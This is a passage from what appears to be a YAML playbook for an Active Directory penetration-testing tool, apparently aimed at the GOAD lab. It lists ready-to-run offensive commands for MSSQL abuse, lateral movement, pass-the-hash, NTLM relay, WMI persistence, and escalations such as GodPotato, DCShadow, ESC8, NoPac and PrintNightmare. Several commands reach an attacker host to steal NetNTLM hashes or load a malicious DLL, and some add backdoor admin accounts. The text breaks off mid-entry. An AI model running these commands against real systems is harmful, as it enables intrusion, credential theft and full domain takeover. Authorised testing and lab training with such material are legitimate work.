        cmd: "impacket-mssqlclient {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP} -windows-auth -q \"EXEC ('SELECT SYSTEM_USER') AT [LINKEDSERVER];\""
      - label: "Steal NetNTLM via xp_dirtree"
        cmd: "impacket-mssqlclient {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP} -windows-auth -q \"EXEC xp_dirtree '\\\\{ATTACKER_IP}\\share'\""
    next:
      - Use xp_cmdshell to get reverse shell
      - Check linked servers for cross-domain access
      - Steal NetNTLM hash via xp_dirtree + Responder
      - Check if MSSQL service account is Kerberoastable
    opsec: >
      xp_cmdshell enables Windows command execution — very loud. Linked server
      queries may be logged by MSSQL auditing. Use minimally.
    cleanup:
      - label: "Disable xp_cmdshell after use"
        cmd: "nxc mssql {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -q \"EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE\""

  # ══════════════════════════════════════
  # LATERAL MOVEMENT
  # ══════════════════════════════════════

  - id: smb_exec_methods
    name: SMB Execution — PSExec / SMBExec / WMIExec
    tab: Lateral Movement
    requires: [TARGET_IP, USERNAME, PASSWORD, DOMAIN]
    requires_priv: local_admin
    tags: [lateral, smb, exec, psexec, wmiexec]
    description: Multiple methods for remote command execution via SMB/WMI. Choose based on noise tolerance.
    commands:
      - label: PSExec — interactive shell (loudest)
        cmd: "impacket-psexec {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP}"
      - label: PSExec — hash
        cmd: "impacket-psexec {DOMAIN}/{USERNAME}@{TARGET_IP} -hashes :{NTLM_HASH}"
      - label: SMBExec — no binary drop (quieter than psexec)
        cmd: "impacket-smbexec {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP}"
      - label: WMIExec — no service created (quietest)
        cmd: "impacket-wmiexec {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP}"
      - label: WMIExec — hash PTH
        cmd: "impacket-wmiexec {DOMAIN}/{USERNAME}@{TARGET_IP} -hashes :{NTLM_HASH}"
      - label: WMIExec — single command
        cmd: "impacket-wmiexec {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP} 'cmd /c whoami /all'"
      - label: NXC — execute command
        cmd: "nxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -x 'whoami /all'"
      - label: NXC — PowerShell command
        cmd: "nxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -X '$env:COMPUTERNAME; (Get-LocalGroupMember Administrators).Name'"
    next_steps:
      - "Dump credentials from the machine"
      - "Check for interesting files and scheduled tasks"
      - "Enumerate domain from machine context"
    opsec: "PSExec creates PSEXESVC service (Event 7045) — very detectable. WMIExec preferred. All generate 4624 type 3 logon events."
    cleanup:
      - label: Remove PSEXESVC service if created
        cmd: "sc \\\\{TARGET_IP} delete PSEXESVC"

  - id: pth_sweep
    name: Pass-the-Hash — Lateral Sweep
    tab: Lateral Movement
    requires: [SUBNET, USERNAME, NTLM_HASH, DOMAIN]
    tags: [pth, lateral, hash, sweep]
    description: Use an NTLM hash to authenticate across multiple hosts without knowing the plaintext password.
    commands:
      - label: Check hash validity across subnet
        cmd: "nxc smb {SUBNET} -u {USERNAME} -H {NTLM_HASH} --continue-on-success"
      - label: PTH — identify admin hosts
        cmd: "nxc smb {SUBNET} -u {USERNAME} -H {NTLM_HASH} --continue-on-success | grep 'Pwn3d'"
      - label: PTH — interactive shell
        cmd: "impacket-wmiexec {DOMAIN}/{USERNAME}@{TARGET_IP} -hashes :{NTLM_HASH}"
      - label: PTH — Evil-WinRM
        cmd: "evil-winrm -i {TARGET_IP} -u {USERNAME} -H {NTLM_HASH}"
      - label: PTH — SMBExec
        cmd: "impacket-smbexec {DOMAIN}/{USERNAME}@{TARGET_IP} -hashes :{NTLM_HASH}"
    next_steps:
      - "Dump SAM/LSASS on admin hosts"
      - "Hunt for DA sessions on compromised machines"
    opsec: "PTH generates type 3 (network) logon events. No failed events — stealthy if hash is valid. ATA/MDI detect PTH patterns."

  - id: dcom_lateral
    name: DCOM — Lateral Movement via COM Objects
    tab: Lateral Movement
    requires: [TARGET_IP, USERNAME, PASSWORD, DOMAIN]
    requires_priv: local_admin
    tags: [dcom, lateral, com, stealthy]
    description: Lateral movement via DCOM (Distributed Component Object Model). Stealthier than SMB exec — uses legitimate Windows functionality.
    commands:
      - label: DCOM via MMC20.Application
        cmd: "impacket-dcomexec {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP} 'cmd.exe' -object MMC20"
      - label: DCOM via ShellWindows
        cmd: "impacket-dcomexec {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP} 'cmd.exe' -object ShellWindows"
      - label: DCOM via ShellBrowserWindow
        cmd: "impacket-dcomexec {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP} 'cmd.exe' -object ShellBrowserWindow"
      - label: DCOM with hash
        cmd: "impacket-dcomexec {DOMAIN}/{USERNAME}@{TARGET_IP} 'cmd.exe' -hashes :{NTLM_HASH}"
    next_steps:
      - "Enumerate local admin group"
      - "Dump credentials from target"
    opsec: "DCOM uses port 135 + ephemeral ports. Not blocked by most AV. Process creation via DCOM may flag EDR."

  - id: wmi_subscription
    name: WMI Event Subscription — Persistence & Execution
    tab: Lateral Movement
    requires: [TARGET_IP, USERNAME, PASSWORD, DOMAIN, ATTACKER_IP]
    requires_priv: local_admin
    tags: [wmi, persistence, fileless, lateral]
    description: Use WMI event subscriptions for persistent code execution and fileless lateral movement.
    commands:
      - label: Create WMI subscription via PowerShell (run on target)
        cmd: "$Filter=Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Argument @{Name='PentestFilter';EventNamespace='root/cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_LocalTime\" AND TargetInstance.Second=5'}; $Consumer=Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Argument @{Name='PentestConsumer';CommandLineTemplate='powershell.exe -enc BASE64_PAYLOAD'}; Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Argument @{Filter=$Filter;Consumer=$Consumer}"
      - label: Remove WMI subscription (cleanup)
        cmd: "Get-WMIObject -Namespace root/subscription -Class CommandLineEventConsumer | Where-Object Name -eq 'PentestConsumer' | Remove-WmiObject"
      - label: List WMI subscriptions
        cmd: "nxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -X 'Get-WMIObject -Namespace root/subscription -Class __EventFilter | Select Name,Query'"
    cleanup:
      - label: Remove event filter
        cmd: "Get-WMIObject -Namespace root/subscription -Class __EventFilter | Where-Object Name -eq 'PentestFilter' | Remove-WmiObject"
      - label: Remove consumer
        cmd: "Get-WMIObject -Namespace root/subscription -Class CommandLineEventConsumer | Where-Object Name -eq 'PentestConsumer' | Remove-WmiObject"
      - label: Remove binding
        cmd: "Get-WMIObject -Namespace root/subscription -Class __FilterToConsumerBinding | Remove-WmiObject"
    opsec: "WMI subscriptions survive reboot and are fileless. Detectable by Autoruns, EDR behavioral detection, and Event ID 19/20/21."

  - id: wmiexec_lateral
    name: WMIExec — Quiet Lateral Movement
    tab: Lateral Movement
    requires: [TARGET_IP, USERNAME, PASSWORD, DOMAIN]
    requires_priv: local_admin
    tags: [lateral, wmi, exec, quiet]
    description: >
      Remote command execution via WMI. No service created — quieter than
      PSExec. Supports password and NTLM hash authentication.
    commands:
      - label: WMIExec (password)
        cmd: "impacket-wmiexec {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP}"
      - label: WMIExec (hash PTH)
        cmd: "impacket-wmiexec {DOMAIN}/{USERNAME}@{TARGET_IP} -hashes :{NTLM_HASH}"
      - label: WMIExec (Kerberos ticket)
        cmd: "impacket-wmiexec -k -no-pass {DOMAIN}/{USERNAME}@{TARGET_IP}"
      - label: Single command execution
        cmd: "impacket-wmiexec {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP} 'whoami /all'"
      - label: NXC WMI exec
        cmd: "nxc wmi {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -x 'whoami'"
    next_steps:
      - "Dump credentials from memory"
      - "Enumerate local admin groups"
      - "Check for interesting files and credentials"
    opsec: "WMI process creation logged (Event 4688 with WMI host). Stealthier than PSExec — no service creation."

  - id: rdp_hijack
    name: RDP Session Hijacking (Local Admin)
    tab: Lateral Movement
    requires: [TARGET_IP, USERNAME, PASSWORD, DOMAIN, TARGET_USER]
    requires_priv: local_admin
    tags: [rdp, session, hijack, lateral, noisy]
    description: >
      Hijack an existing RDP session belonging to another user using the
      tscon technique. Requires SYSTEM privileges (escalate via local admin).
      Useful for taking over a DA session without knowing their password.
    commands:
      - label: List active RDP sessions
        cmd: "nxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -x 'query session'"
      - label: Escalate to SYSTEM via PsExec
        cmd: "psexec -s -i cmd.exe"
      - label: Hijack target session (run as SYSTEM)
        cmd: "tscon <SESSION_ID> /dest:console"
      - label: Alternative — create a service for tscon
        cmd: "sc create rdphijack binpath= \"cmd /c tscon <SESSION_ID> /dest:console\" && sc start rdphijack"
    next_steps:
      - "Pivot using the hijacked session context"
      - "Extract credentials from hijacked user's session"
      - "Run BloodHound as the hijacked user"
    opsec: "Session hijacking logs event 4778 (session reconnect). Victim user sees their session disconnect."
    cleanup:
      - label: Remove service if created
        cmd: "sc stop rdphijack && sc delete rdphijack"

  - id: ntlm_relay_smb
    name: NTLM Relay — SMB to SMB/LDAP
    tab: Lateral Movement
    requires:
      - ATTACKER_IP
      - DC_IP
      - SUBNET
    requires_priv: null
    tags:
      - relay
      - ntlm
      - responder
      - signing-disabled
    description: >
      Relay captured NTLM authentication to hosts with SMB signing disabled.
      GOAD has multiple hosts without SMB signing. Use Responder to capture
      and ntlmrelayx to relay for command execution or LDAP abuse.
    commands:
      - label: "Step 1 — Generate relay target list (signing=False)"
        cmd: "nxc smb {SUBNET} --gen-relay-list /tmp/relay_targets.txt"
      - label: "Step 2 — Start Responder (no SMB/HTTP — let relay handle it)"
        cmd: "responder -I eth0 -dPv --no-smb-server --no-http-server"
      - label: "Step 3a — Relay to SMB for command execution"
        cmd: "impacket-ntlmrelayx -tf /tmp/relay_targets.txt -smb2support -c 'net user hacker Passw0rd123! /add && net localgroup administrators hacker /add'"
      - label: "Step 3b — Relay to LDAP for RBCD/delegation"
        cmd: "impacket-ntlmrelayx -t ldap://{DC_IP} --delegate-access --no-dump"
      - label: "Step 3c — Relay to ADCS for DC certificate (ESC8)"
        cmd: "impacket-ntlmrelayx -t http://{CA_IP}/certsrv/certfnsh.asp --adcs --template DomainController"
    next:
      - Use relayed SMB session for lateral movement
      - If LDAP relay succeeded — use RBCD to impersonate admin
      - If ADCS relay succeeded — authenticate with DC cert for DCSync
    opsec: >
      Very loud — Responder poisons broadcasts. Relay disrupts network traffic.
      Use in a dedicated test window. Generates 4625 events on targets.
    cleanup:
      - label: "Kill Responder"
        cmd: "pkill responder"
      - label: "Remove relay list"
        cmd: "rm -f /tmp/relay_targets.txt"

  - id: pass_the_hash_lateral
    name: Pass the Hash — Lateral Movement
    tab: Lateral Movement
    requires:
      - TARGET_IP
      - USERNAME
      - NTLM_HASH
      - DOMAIN
    requires_priv: null
    tags:
      - pth
      - ntlm
      - lateral
    description: >
      Authenticate with NTLM hash without plaintext password.
      Essential for lateral movement after SAM/LSASS dump or secretsdump.
      Use against all hosts where the account may have local admin.
    commands:
      - label: "Check admin access across subnet with hash"
        cmd: "nxc smb {SUBNET} -u {USERNAME} -H {NTLM_HASH} --local-auth"
      - label: "PTH — WMIExec (quiet)"
        cmd: "impacket-wmiexec {DOMAIN}/{USERNAME}@{TARGET_IP} -hashes :{NTLM_HASH}"
      - label: "PTH — SMBExec"
        cmd: "impacket-smbexec {DOMAIN}/{USERNAME}@{TARGET_IP} -hashes :{NTLM_HASH}"
      - label: "PTH — Evil-WinRM"
        cmd: "evil-winrm -i {TARGET_IP} -u {USERNAME} -H {NTLM_HASH}"
      - label: "PTH — Execute command via NetExec"
        cmd: "nxc smb {TARGET_IP} -u {USERNAME} -H {NTLM_HASH} -x 'whoami /all'"
    next:
      - Dump SAM/LSASS on new host for more credentials
      - Check for DA tokens in memory
      - Enumerate domain from new machine context
    opsec: >
      PTH generates 4624 type 3 logon events. Blends with normal NTLM traffic
      but detectable by ATA/Defender Identity.
    cleanup: []

  - id: winrm_lateral
    name: WinRM Lateral Movement
    tab: Lateral Movement
    requires:
      - TARGET_IP
      - USERNAME
      - PASSWORD
    requires_priv: local_admin
    tags:
      - winrm
      - lateral
      - quiet
    description: >
      Remote command execution via WinRM (port 5985/5986). Quieter than
      PSExec — no service creation. GOAD machines often have WinRM enabled.
      Upload tools via Evil-WinRM's file transfer capabilities.
    commands:
      - label: "Evil-WinRM — interactive shell"
        cmd: "evil-winrm -i {TARGET_IP} -u {USERNAME} -p '{PASSWORD}'"
      - label: "Evil-WinRM — with hash"
        cmd: "evil-winrm -i {TARGET_IP} -u {USERNAME} -H {NTLM_HASH}"
      - label: "Upload file via Evil-WinRM"
        cmd: "evil-winrm -i {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -s /opt/scripts/ -e /opt/exes/"
      - label: "NetExec WinRM check"
        cmd: "nxc winrm {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -x 'whoami'"
    next:
      - Load Mimikatz or SharpHound via Evil-WinRM upload
      - Dump credentials from memory
      - Enumerate domain from new context
    opsec: >
      WinRM traffic is encrypted. Generates 4624 logon events (type 3).
      Less noisy than PSExec — no service creation events.
    cleanup: []

  # ══════════════════════════════════════
  # PRIVILEGE ESCALATION
  # ══════════════════════════════════════

  - id: potato_attacks
    name: Potato Attacks — SeImpersonatePrivilege Escalation
    tab: Privilege Escalation
    requires: [TARGET_IP, USERNAME, PASSWORD]
    requires_priv: local_admin
    tags: [privesc, seimpersonate, potato, godpotato, system]
    description: Escalate from service account / IIS / SQL to SYSTEM using token impersonation via Potato family attacks.
    commands:
      - label: Check for SeImpersonatePrivilege
        cmd: "nxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -x 'whoami /priv | findstr SeImpersonatePrivilege'"
      - label: GodPotato (recommended — works on Server 2019/2022/Win10/11)
        cmd: "GodPotato.exe -cmd 'cmd /c net user hax0r P@ssword123 /add && net localgroup administrators hax0r /add'"
      - label: PrintSpoofer (Win10/Server 2019)
        cmd: "PrintSpoofer64.exe -i -c cmd"
      - label: RoguePotato (older servers)
        cmd: "RoguePotato.exe -r {ATTACKER_IP} -e 'cmd.exe'"
      - label: Upload GodPotato via nxc
        cmd: "nxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' --put-file /tools/GodPotato.exe C:\\Windows\\Temp\\GodPotato.exe"
    next_steps:
      - "Add local admin account for persistent access"
      - "Dump SAM and LSASS now that you have SYSTEM"
    opsec: "Process creation under SYSTEM is logged (4688). GodPotato is well-known to EDR. Consider living-off-the-land alternatives."
    cleanup:
      - label: Remove local admin user if created
        cmd: "net user hax0r /delete"

  - id: dc_shadow
    name: DCShadow — Rogue DC Attack
    tab: Privilege Escalation
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD]
    requires_priv: da
    tags: [dcshadow, replication, persistence, stealthy]
    description: >
      Register a rogue Domain Controller and push arbitrary AD changes that bypass most auditing.
      Can add SIDHistory, modify user attributes, or create admin accounts without typical logs.
      Requires DA or equivalent replication rights.
    commands:
      - label: DCShadow — set user as DA via SIDHistory
        cmd: "mimikatz # lsadump::dcshadow /object:{TARGET_USER} /attribute:SIDHistory /value:S-1-5-21-...-519"
      - label: DCShadow — start rogue DC (run simultaneously in second terminal)
        cmd: "mimikatz # lsadump::dcshadow /push"
      - label: DCShadow — via impacket (remote)
        cmd: "impacket-dcshadow -dc-ip {DC_IP} -u '{DOMAIN}/{USERNAME}' -p '{PASSWORD}' -attribute 'primaryGroupID' -value 512 -target {TARGET_USER}"
    next_steps:
      - "Verify attribute change applied"
      - "Clean up DCShadow registration"
    opsec: "DCShadow bypasses many auditing mechanisms — changes do not generate standard 4720/4728 events. However, spurious replication partner registration is detectable by MDI."

  - id: msol_account
    name: Azure AD Connect — MSOL Account Credential Extraction
    tab: Privilege Escalation
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD]
    requires_priv: local_admin
    tags: [azuread, msol, hybrid, azure, syncpassword]
    description: >
      If Azure AD Connect is installed, extract the MSOL_* sync account credentials.
      This account typically has DCSync rights on the on-premises AD and can be used
      for full domain credential extraction.
    commands:
      - label: Find Azure AD Connect server
        cmd: "nxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' --query '(description=*Azure AD Connect*)' 'sAMAccountName description'"
      - label: Extract MSOL credentials (run on Azure AD Connect server)
        cmd: "Import-Module AdSyncConfig; Get-AdSyncADConnectorCredential"
      - label: Alternative — AdConnectDump
        cmd: ".\\AdConnectDump.exe"
      - label: DCSync with MSOL account
        cmd: "impacket-secretsdump {DOMAIN}/MSOL_account:'{PASSWORD}'@{DC_IP} -just-dc-ntlm"
    next_steps:
      - "Use MSOL account for DCSync"
      - "Check Azure AD for additional attack surface"
    opsec: "Accessing the MSOL credential store on the Azure AD Connect server requires local admin. The query is unusual and may alert."

  - id: group_policy_abuse
    name: GPO Abuse — Malicious Group Policy
    tab: Privilege Escalation
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD]
    requires_priv: null
    tags: [gpo, policy, privesc, scheduled-task, persistence]
    description: Abuse write access to GPOs to execute code on computers or users in scope. Requires CreateChild or WriteProperty on a GPO object.
    commands:
      - label: Find GPOs you can write to
        cmd: "bloodhound-python -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -ns {DC_IP} -c GPO --zip"
      - label: List GPOs and their links
        cmd: "nxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' --query '(objectClass=groupPolicyContainer)' 'displayName gPCFileSysPath'"
      - label: Add malicious scheduled task to GPO (SharpGPOAbuse)
        cmd: "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount {USERNAME} --GPOName 'Vulnerable GPO'"
      - label: Add immediate scheduled task
        cmd: "SharpGPOAbuse.exe --AddImmediateTask --TaskName 'WindowsUpdate' --Author 'NT AUTHORITY\\SYSTEM' --Command 'cmd.exe' --Arguments '/c net user hax0r P@ssword123 /add' --GPOName 'Vulnerable GPO'"
      - label: Force GPO update on target
        cmd: "nxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -x 'gpupdate /force'"
    next_steps:
      - "Verify code execution happened on target machines"
      - "Remove malicious GPO settings immediately"
    opsec: "GPO modifications are logged (Event 5136). GPUpdate triggers 4688. Remove malicious settings before next natural GPO refresh cycle."
    cleanup:
      - label: Remove added user
        cmd: "net user hax0r /delete"

  - id: ad_cs_relay_chain
    name: Full ADCS Relay Chain — ESC8 to DCSync
    tab: Privilege Escalation
    requires: [DC_IP, CA_IP, ATTACKER_IP, DOMAIN, USERNAME, PASSWORD]
    tags: [adcs, esc8, relay, dcsync, full-chain]
    description: >
      Complete attack chain: coerce DC auth → relay to ADCS web enrollment →
      get DC machine certificate → authenticate as DC → DCSync all hashes.
    commands:
      - label: Step 1 — Start NTLM relay to ADCS
        cmd: "impacket-ntlmrelayx -t http://{CA_IP}/certsrv/certfnsh.asp --adcs --template DomainController -smb2support"
      - label: Step 2 — Coerce DC authentication (separate terminal)
        cmd: "python3 PetitPotam.py -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} {ATTACKER_IP} {DC_IP}"
      - label: Step 3 — Authenticate with DC certificate
        cmd: "certipy auth -pfx dc.pfx -dc-ip {DC_IP}"
      - label: Step 4 — DCSync using DC machine account
        cmd: "impacket-secretsdump -hashes :{DC_NTLM_HASH} '{DOMAIN}/DC01$'@{DC_IP} -just-dc-ntlm"
    next_steps:
      - "Extract KRBTGT hash from DCSync output"
      - "Create Golden Ticket for persistence"
    opsec: "Coercion is moderately noisy. Certificate enrollment is logged. Keep the chain to a single run."

  - id: gmsa_abuse
    name: Group Managed Service Account (gMSA) Abuse
    tab: Privilege Escalation
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD]
    requires_priv: null
    tags: [gmsa, service-account, privesc, lateral]
    description: >
      Group Managed Service Accounts have their passwords automatically managed
      by AD. If a compromised account has ReadGMSAPassword rights, the gMSA
      password hash can be extracted and used for PTH.
    commands:
      - label: Find gMSA accounts
        cmd: "nxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' --gmsa"
      - label: Check who can read gMSA password
        cmd: "nxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' --query '(objectClass=msDS-GroupManagedServiceAccount)' 'sAMAccountName msDS-ManagedPasswordID'"
      - label: Read gMSA password (if permitted)
        cmd: "python3 gMSADumper.py -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -l {DC_IP}"
      - label: PTH with gMSA hash
        cmd: "nxc smb {SUBNET} -u '<GMSA_ACCOUNT>$' -H '<GMSA_HASH>' --continue-on-success"
    next_steps:
      - "Use gMSA hash for PTH"
      - "Check gMSA permissions in BloodHound"
      - "Enumerate what the gMSA account has access to"
    opsec: "gMSA password reads are logged. Check if the gMSA is monitored by ATA/MDI."

  - id: pxethief_auth
    name: PXEThief — Authenticated PXE Credential Theft
    tab: Privilege Escalation
    requires: [TARGET_IP, USERNAME, PASSWORD]
    requires_priv: local_admin
    tags: [pxe, sccm, creds, registry, stealthy]
    description: >
      Extract the PXE boot password directly from the SCCM Distribution Point
      registry. Requires local admin on the DP server. Password is stored
      encrypted in the registry and can be decrypted with PXEThief.
    commands:
      - label: Read PXE password from DP registry
        cmd: "nxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -x 'reg query HKLM\\software\\microsoft\\sms\\dp /v Reserved1'"
      - label: PXEThief — decrypt from variables file
        cmd: "python3 pxethief.py 5 variables.var"
      - label: PXEThief — crack hash with hashcat
        cmd: "hashcat -m 19850 pxe_hash.txt /usr/share/wordlists/rockyou.txt"
      - label: PXEThief — unauthenticated (network position)
        cmd: "python3 pxethief.py 1"
    next_steps:
      - "Use PXE password to boot and access task sequences"
      - "Extract credentials from SCCM task sequences"
      - "Check SCCM NAA (Network Access Account) credentials"
    opsec: "Registry reads appear as normal admin activity. PXE TFTP requests are logged on the DP."

  - id: print_nightmare
    name: PrintNightmare (CVE-2021-1675 / CVE-2021-34527)
    tab: Privilege Escalation
    requires: [TARGET_IP, ATTACKER_IP, USERNAME, PASSWORD, DOMAIN]
    requires_priv: null
    tags: [printnightmare, cve, privesc, rce, critical]
    description: >
      Abuse the Windows Print Spooler service to load a malicious DLL and
      escalate to SYSTEM (local) or achieve remote code execution (remote).
      Check patching status before attempting.
    commands:
      - label: Check if Spooler is running
        cmd: "nxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -M spooler"
      - label: Check patch level
        cmd: "nxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -x 'wmic qfe get hotfixid | findstr KB5004945 KB5004946'"
      - label: PrintNightmare — add local admin (Python)
        cmd: "python3 CVE-2021-1675.py {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP} '\\\\{ATTACKER_IP}\\share\\evil.dll'"
      - label: Host malicious DLL share
        cmd: "impacket-smbserver share /tmp/payload -smb2support"
      - label: Cube0x0 — remote via named pipe
        cmd: "python3 printnightmare.py {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP} '\\\\{ATTACKER_IP}\\share\\evil.dll'"
    next_steps:
      - "Escalate to SYSTEM via loaded DLL"
      - "Dump LSASS once SYSTEM is obtained"
      - "Pivot to additional hosts if Spooler is running"
    opsec: >
      Generates System events 7036 (service start), 316 (print driver add).
      VERY noisy on EDR. Confirm patch status first — may cause spooler crash.
    cleanup:
      - label: Remove dropped DLL from spool driver directory
        cmd: "del /f C:\\Windows\\System32\\spool\\drivers\\x64\\3\\evil.dll"

  - id: nopac
    name: NoPac — SamAccountName Spoofing (CVE-2021-42287)
    tab: Privilege Escalation
    requires:
      - DC_IP
      - DOMAIN
      - USERNAME
      - PASSWORD
    requires_priv: null
    tags:
      - nopac
      - cve-2021-42287
      - privesc
      - domain-compromise
      - machine-account
    description: >
      CVE-2021-42287/42278: Add a computer, rename it to match the DC name
      (sans $), get a TGT, reset the name, then S4U2self to impersonate
      administrator. Requires MAQ > 0 (default is 10). Full domain compromise
      from any domain user. Works against GOAD's Windows Server 2019 DCs.
    commands:
      - label: "Step 1 — Check Machine Account Quota"
        cmd: "nxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' -M maq"
      - label: "Step 2 — Add fake computer account"
        cmd: "impacket-addcomputer {DOMAIN}/{USERNAME}:'{PASSWORD}' -computer-name 'FAKEMACHINE$' -computer-pass 'FakeMachinePass123!' -dc-ip {DC_IP}"
      - label: "Step 3 — Clear SPNs on fake computer"
        cmd: "addspn.py --clear -t 'FAKEMACHINE$' -u '{DOMAIN}\\{USERNAME}' -p '{PASSWORD}' {DC_IP}"
      - label: "Step 4 — Rename fake computer to DC name (no $)"
        cmd: "renameMachine.py -current-name 'FAKEMACHINE$' -new-name '{TARGET_COMPUTER}' -dc-ip {DC_IP} {DOMAIN}/{USERNAME}:'{PASSWORD}'"
      - label: "Step 5 — Get TGT as fake DC"
        cmd: "impacket-getTGT {DOMAIN}/'{TARGET_COMPUTER}':'FakeMachinePass123!' -dc-ip {DC_IP}"
      - label: "Step 6 — Reset computer name back"
        cmd: "renameMachine.py -current-name '{TARGET_COMPUTER}' -new-name 'FAKEMACHINE$' -dc-ip {DC_IP} {DOMAIN}/{USERNAME}:'{PASSWORD}'"
      - label: "Step 7 — S4U2self to impersonate administrator"
        cmd: "export KRB5CCNAME=/tmp/{TARGET_COMPUTER}.ccache && impacket-getST -self -impersonate 'administrator' -altservice 'CIFS/{TARGET_COMPUTER}.{DOMAIN}' -k -no-pass -dc-ip {DC_IP} '{DOMAIN}/{TARGET_COMPUTER}'"
      - label: "Step 8 — DCSync with obtained ticket"
        cmd: "export KRB5CCNAME=/tmp/administrator@CIFS_{TARGET_COMPUTER}.{DOMAIN}.ccache && impacket-secretsdump -k -no-pass {DC_IP}"
      - label: "Cleanup — delete fake computer"
        cmd: "impacket-addcomputer {DOMAIN}/Administrator -hashes :<DA_NTHASH> -computer-name 'FAKEMACHINE$' -delete -dc-ip {DC_IP}"
    next:
      - Extract all domain credentials with secretsdump
      - Use DA hash for golden ticket persistence
      - Enumerate cross-domain trust paths
    opsec: >
      Noisy — creates a computer account (event 4741) and renames it multiple
      times (event 4781). Detectable by EDR and Defender Identity. Use quickly
      and clean up the fake computer immediately.
    cleanup:
      - label: "Delete fake computer account"
        cmd: "impacket-addcomputer {DOMAIN}/Administrator -hashes :NTHASH -computer-name 'FAKEMACHINE$' -delete -dc-ip {DC_IP}"
      - label: "Remove ticket files"
        cmd: "rm -f /tmp/*.ccache"

  - id: printnightmare
    name: PrintNightmare — CVE-2021-1675
    tab: Privilege Escalation
    requires:
      - TARGET_IP
      - DOMAIN
      - USERNAME
      - PASSWORD
      - ATTACKER_IP
    requires_priv: null
    tags:
      - printnightmare
      - cve-2021-1675
